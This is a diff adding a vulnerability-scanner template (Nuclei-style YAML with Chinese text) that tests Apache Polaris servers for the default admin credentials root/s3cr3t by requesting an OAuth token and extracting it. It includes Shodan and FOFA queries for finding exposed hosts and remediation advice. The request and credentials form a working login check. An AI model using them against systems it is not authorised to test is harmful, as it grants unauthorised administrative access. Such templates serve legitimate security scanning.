@@ -1,0 +1,49 @@
+id: apache-polaris-default-admin-login
+
+info:
+  name: Apache Polaris 默认管理员凭据登录漏洞
+  author: icarot
+  severity: high
+  description: |
+    Apache Polaris 服务器配置了默认管理凭据，攻击者可利用默认用户名 root 与密码 s3cr3t 登录系统，进而执行未授权操作。该模板用于检测目标是否仍在使用默认凭据。
+  reference:
+    - https://github.com/apache/polaris
+  classification:
+    cpe: cpe:2.3:a:apache:polaris:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    vendor: apache
+    product: polaris
+    shodan-query: http.title:"Apache Polaris"
+    fofa-query: title="Apache Polaris"
+  tags: Apache-Polaris
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+http:
+  - raw:
+      - |
+        POST /api/catalog/v1/oauth/tokens HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        grant_type=client_credentials&client_id={{username}}&client_secret={{password}}&scope=PRINCIPAL_ROLE:ALL
+    attack: pitchfork
+    payloads:
+      username:
+        - root
+      password:
+        - s3cr3t
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "access_token", "token_type", "issued_token_type", "expires_in")'
+        condition: and
+    extractors:
+      - type: json
+        name: accessToken
+        json:
+          - '.access_token'
+
+# digest: 4a0a004730450220561667f8031810eb6ff6a76b8c97493e89816047afc6235266fa5751f247991c022100d55252cdd049854de1a5464706187e2723edc9131b6c79500eddfaf56b03fc12:922c64590222798bb761d5b6d8e72950
